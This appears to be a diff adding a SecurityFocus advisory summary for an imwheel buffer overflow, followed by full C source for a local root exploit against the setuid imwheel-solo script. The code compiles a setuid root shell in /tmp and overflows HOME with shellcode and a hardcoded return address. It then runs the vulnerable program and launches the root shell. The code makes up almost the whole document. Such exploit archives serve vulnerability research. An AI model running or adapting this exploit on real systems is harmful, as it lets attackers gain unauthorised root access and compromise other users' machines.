@@ -1,0 +1,98 @@
+source: http://www.securityfocus.com/bid/1060/info
+ 
+A vulnerability exists in the 'imwheel' package for Linux. This package is known to be vulnerable to a buffer overrun in its handling of the HOME environment variable. By supplying a sufficiently long string containing machine executable code, the imwheel program can be caused to run arbitrary commands as root. This is due to a setuid root perl script named 'imwheel-solo' which invokes the imwheel program with effective UID 0. 
+
+/*** Halloween 4 local root exploit for imwheel-solo. Other distros are
+ *** maybe affected as well.
+ *** (C) 2000 by C-skills development. Under the GPL. 
+ *** 
+ *** Bugdiscovery + exploit by S. Krahmer & Stealth.
+ ***
+ *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
+ ***
+ *** other advisories and kewl stuff at:
+ *** http://www.cs.uni-potsdam.de/homepages/students/linuxer
+ ***
+ ***/
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <errno.h>
+
+
+
+/* chown("/tmp/boomsh", 0, 0); chmod("/tmp/boomsh", 04755);
+ */
+char shell[] =
+"\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc6\x0d\x31\xc9\xb1\x58\x80\x36\x01\x46\xe2\xfa"
+"\xea\x0d\x2e\x75\x6c\x71\x2e\x63\x6e\x6e\x6c\x72\x69\x01\x80\xed"
+"\x66\x2a\x01\x01\x54\x88\xe4\x57\x52\xe9\x01\x01\x01\x01\x5a\x80\xc2\xab\x11"
+"\x01\x01\x30\xc8\x8c\xb2\x3b\xee\xfe\xfe\xb9\xb7\x01\x01\x01\x88\xcb\x52\x88"
+"\xf2\xcc\x81\xb8\xec\x08\x01\x01\xb9\x0e\x01\x01\x01\x52\x88\xf2\xcc\x81\x30"
+"\xc1\x5a\x5f\x88\xed\x5c\xc2\x91\x91\x91\x91\x91\x91\x91\x91";
+
+
+/* filename-buffer plus ret + ebp
+ */
+#define buflen (2048+8)
+
+int main(int argc, char **argv)
+{						       		
+	char *im[] = {
+		"/usr/X11R6/bin/imwheel-solo", 
+		0
+	};
+	char *a[] = {
+		"/tmp/boomsh",
+		0
+	};
+	FILE *f;
+	struct stat s;	
+	char boom[buflen+10];
+	int i = 0, j = 0, ret =  0xbfffee68;	/* this address works for me */
+
+	if ((f = fopen("/tmp/boomsh.c", "w+")) == NULL) {
+		perror("fopen");
+		exit(errno);
+	}
+	printf("Creating boom-shell...\n");
+	fprintf(f, "int main() {char *a[]={\"/bin/sh\",0};\nsetuid(0);\nexecve(*a, a, 0);\nreturn 0;}\n");
+	fclose(f);
+	system("cc /tmp/boomsh.c -o /tmp/boomsh");
+
+	printf("Creating shellcode...\n");
+    	memset(boom, 0, sizeof(boom));
+	memset(boom, 0x90, buflen);
+	if (argc > 1)
+		ret += atoi(argv[1]);
+	else
+		printf("You can also add an offset to the commandline.\n");
+	for (i = buflen-strlen(shell)-4; i < buflen-4; i++)
+		boom[i] = shell[j++];
+	*(long*)(&boom[i]) = ret; 
+	
+	printf("Get the real deal at http://www.cs.uni-potsdam.de/homepages/students/linuxer\n"
+	       "Respect other users privacy!\n");
+	
+	setenv("HOME", boom, 1);
+	setenv("DISPLAY", ":0", 1);
+	
+	printf("Invoking vulnerable program (imwheel-solo)...\n");
+	if (fork() == 0) {
+		execl(im[0], im[0], im[1], im[2], 0);
+	}
+	sleep(4);
+	
+	memset(&s, 0, sizeof(s));
+	stat("/tmp/boomsh", &s);
+	if ((S_ISUID & s.st_mode) != S_ISUID) {
+		printf("Boom-shell not SUD-root! Wrong offset or patched version of imwheel.\n");
+		return -1;
+	}
+	/* Huh? :-)
+	 */
+	printf("Knocking on heavens door...\n");
+	execve(a[0], a, 0);
+	return 0;
+}
